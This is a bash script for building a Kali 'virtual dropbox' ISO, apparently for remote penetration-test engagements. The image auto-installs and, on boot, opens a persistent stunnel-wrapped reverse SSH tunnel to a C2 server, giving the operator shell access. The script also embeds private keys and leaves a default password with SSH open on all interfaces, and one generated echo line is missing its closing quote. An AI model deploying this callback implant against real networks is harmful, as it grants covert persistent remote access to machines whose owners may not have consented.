#!/usr/bin/env bash

#Check root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

#TODO replace with getopts
read -p "Is this your C2 server? (y/n): " IS_C2_ANSWER
if [ "$IS_C2_ANSWER" == "y" ] || [ "$IS_C2_ANSWER" == "Y" ] || [ "$IS_C2_ANSWER" == "Yes" ] || [ "$IS_C2_ANSWER" == "yes" ]; then
    IS_C2="True"
elif [ "$IS_C2_ANSWER" == "n" ] || [ "$IS_C2_ANSWER" == "N" ] || [ "$IS_C2_ANSWER" == "No" ] || [ "$IS_C2_ANSWER" == "no" ]; then
    IS_C2="False"
else
    echo "Could not read answer. Exiting..."
    exit 1
fi

#################
#TODO Globals
#################

#################
#Server setup
#################

#SSH key that will be saved to the client.
SSH_KEY="/tmp/id_rsa"
ssh-keygen -b 2048 -t rsa -f "$SSH_KEY" -q -N ""

##########################
#Lack of indents here are for readability of the HERE DOCUMENTS (EOF/EOSCRIPT)
##########################
# If this script is being run on the C2 server, just create the config files and drop them in the right places.

SSH_PUBKEY_CONTENTS=$(cat $SSH_KEY.pub)
SSH_PRIVKEY_CONTENTS=$(cat $SSH_KEY)

if [ "$IS_C2" == "True" ]; then
#Create self signed cert for stunnel
openssl req -new -x509 -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem -days 365 -nodes -subj "/C=US" >/dev/null 2>&1

#TODO set connect to localhost to prevent ANY_ADDR Leakage
#Create stunnel.conf (server config)
cat << EOF > /etc/stunnel/stunnel.conf
cert = /etc/stunnel/stunnel.pem
client = no
pid = /etc/stunnel/stunnel.pid
output = /etc/stunnel/stunnel.log

[ssl_tunnel]
accept = 0.0.0.0:443
connect = 22
EOF

#Start stunnel on server
stunnel4

#Add user autossh without a password ( you will need to set the password as a priv user if you need/want to log into this account
adduser --disabled-password --gecos "" --shell /bin/rbash autossh
mkdir -p /home/autossh/.ssh/


#Copy the public key that will be dropped on the client to connect back, and add it to the authorized keys file on the C2 server; allowing the client to connect automatically to the server
echo "command=\"\"" $SSH_PUBKEY_CONTENTS >> /home/autossh/.ssh/authorized_keys
cp $SSH_KEY ~/.ssh/dropbox.key


# If this is being run on a server other than the C2 server, don't change the local server files, but create a script that the user can run on the C2 server
else

cat << EOSCRIPT > c2_setup.sh
echo "[+] Creating self signed cert for stunnel and saving it to /etc/stunnel/stunnel.pem"
openssl req -new -x509 -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem -days 365 -nodes -subj "/C=US" >/dev/null 2>&1

echo "[+] Creating stunnel.conf (server config)"
cat << EOF > /etc/stunnel/stunnel.conf
cert = /etc/stunnel/stunnel.pem
client = no
output = /etc/stunnel/stunnel.log

[ssl_tunnel]
accept = 0.0.0.0:443
connect = 22
EOF

echo "[+] Starting stunnel on server"
stunnel4

echo "[+] Adding user autossh without a password (you will need to set the password as a priv user if you need/want to log into this account)"
adduser --disabled-password --gecos "" autossh
mkdir -p /home/autossh/.ssh/

echo "[+] Copying the dropbox pubkey into autossh's authorized keys so that the dropbox can log into this C2 server"
echo "command=\"\"" $SSH_PUBKEY_CONTENTS >> /home/autossh/.ssh/authorized_keys
echo "[+] Copying the dropbox's private key to ~/.ssh/dropbox.key so that you can ssh to the dropbox with a key if you want.
echo $SSH_PRIVKEY_CONTENTS >> ~/.ssh/dropbox.key

EOSCRIPT

chmod +x c2_setup.sh
fi

#################
#Client Setup
#################

#If specified in the command line, get IP that the client will reach out to (a public IP most likely)
C2IP=$1

#If the IP was not sent via the command line, grab it from the aws metadata service
if [ -z "$C2IP" ]; then
    C2IP=$(curl ifconfig.me)
    echo $C2IP
fi

#If still no IP, give up
if [ -z "$C2IP" ]; then
    echo "Could not determine public IP. Exiting.." >&2
    exit 1
fi

#Set the stunnel port
C2PORT="443"
ROOT_PW=$(tr -cd '[:alnum:]' < /dev/urandom | fold -w20 | head -n1)

#Update the c2 box with the tools it needs to build an ISO
apt update
apt install git live-build cdebootstrap curl -y
apt install dialog
cd /opt
git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git build
cd /opt/build

#Variant Selection
VARIANTS=( $(find /opt/build/kali-config/ -maxdepth 1 -type d -iname "variant*" | grep -o '[^-]*'$) )
PS3="Select Kali live variant: "
select variant in "${VARIANTS[@]}"; do
  for item in "${VARIANTS[@]}"; do
    if [[ $item == $variant ]]; then
      break 2
    fi
  done
done
echo "VARIANT=$variant"
VARIANT=$variant

#Metapackage Selection
METAPACKAGES=($(sudo apt-get -qq update && apt-cache --quiet search kali-linux | cut -d " " -f1))
#adding an integer for the non-visible description column of dialog
METAOPTS=""; i=0;
for item in "${METAPACKAGES[@]}"; do i=$((i+1)); METAOPTS="$METAOPTS$(echo $item) $(echo $i) ";done;
METAOPTS=(${METAOPTS[@]})
DIALOG_CMD=(dialog --stdout --no-items \
	--backtitle "Select Kali Metapackages with <SPACE>." \
	--title "Kali Metapackages" \
        --separate-output \
        --ok-label "Confirm" \
        --checklist "Select Kali Metapackages with <SPACE>" 22 76 16)
	METAPACKAGE_SELECTIONS=($("${DIALOG_CMD[@]}" "${METAOPTS[@]}"))


#Prepare live environment with specific tools needed for the engagement
mkdir -p /opt/build/kali-config/variant-$VARIANT/package-lists/
mkdir -p /opt/build/kali-config/common/includes.binary/isolinux/
mkdir -p /opt/build/kali-config/common/hooks/live/
mkdir -p /opt/build/kali-config/common/includes.installer/
mkdir -p /opt/build/kali-config/common/includes.chroot/home/kali/.ssh/
mkdir -p /opt/build/kali-config/common/includes.chroot/usr/local/bin/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/cron.d/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/stunnel/
mkdir -p /opt/build/kali-config/common/includes.chroot/usr/local/bin/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/network/interfaces.d/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/systemd/system
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/ssh/
mkdir -p /opt/build/kali-config/common/packages.chroot
sleep 2

#Toolsets to auto install in the client ISO
#Most variants come preloaded with kali-linux-core,kali-desktop-live,kali-linux-default, and kali-desktop-{variant}
#To add more metapackages, select them from https://tools.kali.org/kali-metapackages and add below
cat << EOF >> /opt/build/kali-config/variant-$VARIANT/package-lists/kali.list.chroot
stunnel4
autossh
powershell
EOF
for metapackage in "${METAPACKAGE_SELECTIONS[@]}"; do
    echo "$metapackage" >> /opt/build/kali-config/variant-$VARIANT/package-lists/kali.list.chroot
done

#ensure ssh is running
systemctl start sshd

#copy public/private keys to VM so that the DropBox can make the autossh connection back to the C2 server
cp "$SSH_KEY" /opt/build/kali-config/common/includes.chroot/home/kali/.ssh/
cp "$SSH_KEY".pub /opt/build/kali-config/common/includes.chroot/home/kali/.ssh/

#copy public key to authorized keys on the VM/dropbox so that we can ssh in to the VM/DropBox with the private key
cp "$SSH_KEY".pub  /opt/build/kali-config/common/includes.chroot/home/kali/.ssh/authorized_keys

#add known host to dropbox to enforce strict host checking for each handshake]
#edit: stunnel auto bypasses strict host key checking and auto-drops known hosts in root's home, since the systemd units are built/run as root.
#TODO : either replace stunnel with go-http-tunnel, or create the systemd units at the user level, or both
#ssh-keyscan -t rsa 127.0.0.1 | sed -r "s/127.0.0.1/$C2IP/g" > /opt/build/kali-config/common/includes.chroot/home/kali/.ssh/known_hosts

#stunnel config on client
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/stunnel/stunnel.conf
pid = /var/run/stunnel.pid
client=yes
[ssh]
accept = 127.0.0.1:43434
connect = ${C2IP}:${C2PORT}
EOF

#################
#Systemd
#################

cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/systemd/system/autossh.service
[Unit]
Description=Autossh
Wants=network-online.target
Requires=stunnel.service
Requires=ssh.service
After=network-online.target ssh.service
;StartLimitIntervalSec=0

[Service]
Type=simple
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M0 \
-o "ServerAliveInterval 10" -o "ServerAliveCountMax 3" \
-o "ConnectTimeout 10" -o "ExitOnForwardFailure yes" \
-o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" \
-o "StrictHostKeyChecking=yes" \
-N \
-i /home/kali/.ssh/id_rsa \
-R 9999:127.0.0.1:22 autossh@127.0.0.1 -p43434
;Restart=always
;RestartSec=10
ExecStop=/usr/bin/killall autossh

[Install]
WantedBy=multi-user.target
EOF

cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/systemd/system/stunnel.service
[Unit]
Description=SSLTunnel
Wants=network-online.target
Before=autossh.service
After=network-online.target

[Service]
Type=forking
ExecStart=/usr/bin/stunnel4 /etc/stunnel/stunnel.conf
ExecStop=/usr/bin/killall stunnel4
Restart=always
RestartSec=8

[Install]
WantedBy=multi-user.target
EOF

#Add a customised syslinux boot entry which includes a boot parameter for a custom preseed file. This will insure that Kali autoboots into an installation.
cat << EOF > /opt/build/kali-config/common/includes.binary/isolinux/install.cfg
label install
menu label ^Install
linux /install/vmlinuz
initrd /install/initrd.gz
append vga=788 -- quiet file=/cdrom/install/preseed.cfg locale=en_US keymap=us hostname=KaliVirtualDropbox domain=local.lan
EOF

#Directives which override the default ui prompt. Goes straight into the live mode entry post-grub
cat << EOF > /opt/build/kali-config/common/includes.binary/isolinux/isolinux.cfg
include menu.cfg
ui vesamenu.c32
default live-
prompt 0
timeout 5
EOF

#Insure that the default network interface is alive on boot.
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/network/interfaces.d/eth0
auto eth0
iface eth0 inet dhcp
EOF

#Client SSH Config
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/ssh/sshd_config
Port 22
Protocol 2
UsePrivilegeSeparation yes
KeyRegenerationInterval 3600
ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
LoginGraceTime 120
PermitRootLogin no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
ClientAliveInterval 180
UseDNS no
EOF

#################
#Hooks
#################

#systemd soft links via live hooking to autostart custom services
echo 'systemctl enable ssh' > /opt/build/kali-config/common/hooks/live/ssh.hook.chroot
echo 'systemctl enable stunnel' > /opt/build/kali-config/common/hooks/live/stunnel.hook.chroot
echo 'systemctl enable autossh' > /opt/build/kali-config/common/hooks/live/autossh.hook.chroot
#Host keys are blank on start
echo '/usr/bin/ssh-keygen -A' > /opt/build/kali-config/common/hooks/live/sshKeygen.hook.chroot
chmod +x /opt/build/kali-config/common/hooks/live/*.hook.chroot

#Default preseed file is leveraged, which will run through a default Kali installation with no input (unattended).
sed -i "s/hostname string kali/hostname string KaliVirtualDropbox/" /opt/build/kali-config/common/includes.installer/preseed.cfg

#TODO - preseed currently doesnt support root login, rn it's kali/kali. Support unique password for every VM. 
#theoretically a live hook could just execute $(usermod --password $ROOT_PW kali) rather than using debo installer seeds
sed -i "s/root-password-again password toor/root-password-again password $ROOT_PW/" /opt/build/kali-config/common/includes.installer/preseed.cfg
sed -i "s/root-password password toor/root-password password $ROOT_PW/" /opt/build/kali-config/common/includes.installer/preseed.cfg

#Build the ISO. 
echo "Please be patient while the ISO is built...\n"
cd /opt/build/
/opt/build/build.sh --distribution kali-rolling --variant $VARIANT --verbose
#mv /opt/build/images/kali-linux-rolling-amd64.iso /opt/build/images/KaliVirtualDropbox.iso
echo ""
if [ "$IS_C2" == "True" ]; then
    echo ""
    echo "  *******************************************************************"
    echo "  *                             ISO Ready                           *"
    echo "  *******************************************************************"
    echo ""
#    echo "[+] The root password on this ISO is: " $ROOT_PW
    echo "[+] The IP that your Kali Virtual Dropbox will reach out to is: " $C2IP
    echo ""
    echo "[+] On the C2 server:"
    echo ""
    echo "[+]   1) The user autossh does not have a password set."
    echo "[+]      To set it, type: sudo passwd autossh (this is not required for the callback to work)"
    echo "[+]   2) Your image can be found here: /opt/build/images/"
    echo "[+]   3) Serve it up with something like simple-https-server: https://gist.github.com/dergachev/7028596"
    echo ""
    echo "[+] That's it. Now have your remote contact install the ISO on a VM, bootable USB, or on hardware."
    echo "[+] Once the install is complete, the dropbox will reach out to the C2 server and create a tunnel"
    echo "[+]  Note: This make take up to 5 min after boot"
    echo ""
    echo "[+] The public ssh key has been added to /home/autossh/.ssh/authorized_keys for you"
    echo "[+] The stunnel service has been configured and started"
    echo ""
    echo "[+] SSH to your dropbox:"
    echo "       With key:      sudo ssh kali@localhost -p9999 -i /root/.ssh/dropbox.key"
    echo "       With password: ssh kali@localhost -p9999"
    echo "[!] Be warned: ssh is running on the dropbox INADDR_ANY interface with a default password. Change the password immeadeatly."
    echo ""
else
    echo "  1) Copy the following script to the c2 server and run it: "
    echo "        c2_setup.sh "
    echo ""
fi
